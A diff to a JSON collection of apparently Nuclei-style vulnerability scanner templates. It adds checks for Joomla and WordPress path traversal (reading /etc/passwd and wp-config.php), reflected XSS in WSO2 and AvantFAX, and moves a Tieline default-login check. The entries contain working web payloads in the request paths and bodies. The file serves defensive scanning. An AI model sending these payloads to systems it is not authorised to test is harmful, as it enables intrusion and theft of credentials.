@@ -471,6 +471,40 @@
       ]
     },
     {
+      "id": "CVE-2010-2682",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Realtyna Translator (com_realtyna) component 1.0.15 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impact via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component Realtyna Translator 1.0.15 - Local File Inclusion",
+        "reference": "- https://www.exploit-db.com/exploits/14017\n- https://www.cvedetails.com/cve/CVE-2010-2682\n",
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_realtyna&controller=../../../../../../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-2861",
       "info": {
         "author": "pikpikcu",
@@ -2430,6 +2464,43 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/infusionsoft/Infusionsoft/tests/notAuto_test_ContactService_pauseCampaign.php?go=go%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&contactId=contactId%27%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&campaignId=campaignId%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2014-5368",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the file_get_contents function in downloadfiles/download.php in the WP Content Source Control (wp-source-control) plugin 3.0.0 and earlier for WordPress allows remote attackers to read arbitrary files via a .. (dot dot) in the path parameter.",
+        "name": "WordPress Plugin WP Content Source Control - Directory Traversal",
+        "reference": "- https://www.exploit-db.com/exploits/39287\n- https://www.cvedetails.com/cve/CVE-2014-5368\n",
+        "severity": "high",
+        "tags": "cve,cve2014,wordpress,wp-plugin,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "DB_NAME",
+                "DB_PASSWORD"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/wp-source-control/downloadfiles/download.php?path=../../../../wp-config.php"
           ]
         }
       ]
@@ -5025,6 +5096,43 @@
       ]
     },
     {
+      "id": "CVE-2017-14651",
+      "info": {
+        "author": "mass0ma",
+        "description": "WSO2 Data Analytics Server 3.1.0 has XSS in carbon/resources/add_collection_ajaxprocessor.jsp via the collectionName or parentPath parameter.",
+        "name": "Reflected XSS - WSO2 Data Analytics Server",
+        "severity": "medium",
+        "tags": "cve,cve2017,wso2,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<img src=x onerror=alert(document.domain)>",
+                "Failed to add new collection"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/carbon/resources/add_collection_ajaxprocessor.jsp?collectionName=%3Cimg%20src=x%20onerror=alert(document.domain)%3E&parentPath=%3Cimg%20src=x%20onerror=alert(document.domain)%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2017-14849",
       "info": {
         "author": "Random_Robbie",
@@ -5454,6 +5562,49 @@
           },
           "raw": [
             "GET /cgi-bin/§endpoint§?LD_DEBUG=help HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\nAccept: */*\nConnection: close\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2017-18024",
+      "info": {
+        "author": "pikpikcu",
+        "description": "AvantFAX 3.3.3 has XSS via an arbitrary parameter name to the default URI, as demonstrated by a parameter whose name contains a SCRIPT element and whose value is 1.\n",
+        "name": "AvantFAX 3.3.3 XSS",
+        "reference": "- https://hackerone.com/reports/963798\n- http://packetstormsecurity.com/files/145776/AvantFAX-3.3.3-Cross-Site-Scripting.html\n- https://nvd.nist.gov/vuln/detail/CVE-2017-18024\n",
+        "severity": "medium",
+        "tags": "cve,cve2017,xss,avantfax"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(\"{{randstr}}\")</script>",
+                "AvantFAX"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&password=admin&_submit_check=1&jlbqg<script>alert(\"{{randstr}}\")</script>b7g0x=1\n"
           ]
         }
       ]
@@ -21722,6 +21873,54 @@
       ]
     },
     {
+      "id": "CVE-2021–35336",
+      "info": {
+        "author": "Pratik Khalane",
+        "description": "Finding the Tieline Admin Panels with default credentials.",
+        "name": "Unauthorised Remote Access of Internal Panel",
+        "reference": "- https://pratikkhalane91.medium.com/use-of-default-credentials-to-unauthorised-remote-access-of-internal-panel-of-tieline-c1ffe3b3757c\n- https://nvd.nist.gov/vuln/detail/CVE-2021-35336\n",
+        "severity": "critical",
+        "tags": "cve,cve2021,tieline,default-login"
+      },
+      "requests": [
+        {
+          "headers": {
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
+            "Referer": "{{BaseURL}}/assets/base/home.html",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
+          },
+          "matchers": [
+            {
+              "condition": "and",
+              "type": "word",
+              "words": [
+                "<SERIAL>",
+                "<VERSION>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/xml"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/api/get_device_details"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-35464",
       "info": {
         "author": "madrobot",
@@ -21831,54 +22030,6 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/http_header.php"
-          ]
-        }
-      ]
-    },
-    {
-      "id": "CVE-2021–35336",
-      "info": {
-        "author": "Pratik Khalane",
-        "description": "Finding the Tieline Admin Panels with default credentials.",
-        "name": "Unauthorised Remote Access of Internal Panel",
-        "reference": "- https://pratikkhalane91.medium.com/use-of-default-credentials-to-unauthorised-remote-access-of-internal-panel-of-tieline-c1ffe3b3757c\n- https://nvd.nist.gov/vuln/detail/CVE-2021-35336\n",
-        "severity": "critical",
-        "tags": "cve,cve2021,tieline,default-login"
-      },
-      "requests": [
-        {
-          "headers": {
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
-            "Referer": "{{BaseURL}}/assets/base/home.html",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
-          },
-          "matchers": [
-            {
-              "condition": "and",
-              "type": "word",
-              "words": [
-                "<SERIAL>",
-                "<VERSION>"
-              ]
-            },
-            {
-              "part": "header",
-              "type": "word",
-              "words": [
-                "text/xml"
-              ]
-            },
-            {
-              "status": [
-                200
-              ],
-              "type": "status"
-            }
-          ],
-          "matchers-condition": "and",
-          "method": "GET",
-          "path": [
-            "{{BaseURL}}/api/get_device_details"
           ]
         }
       ]
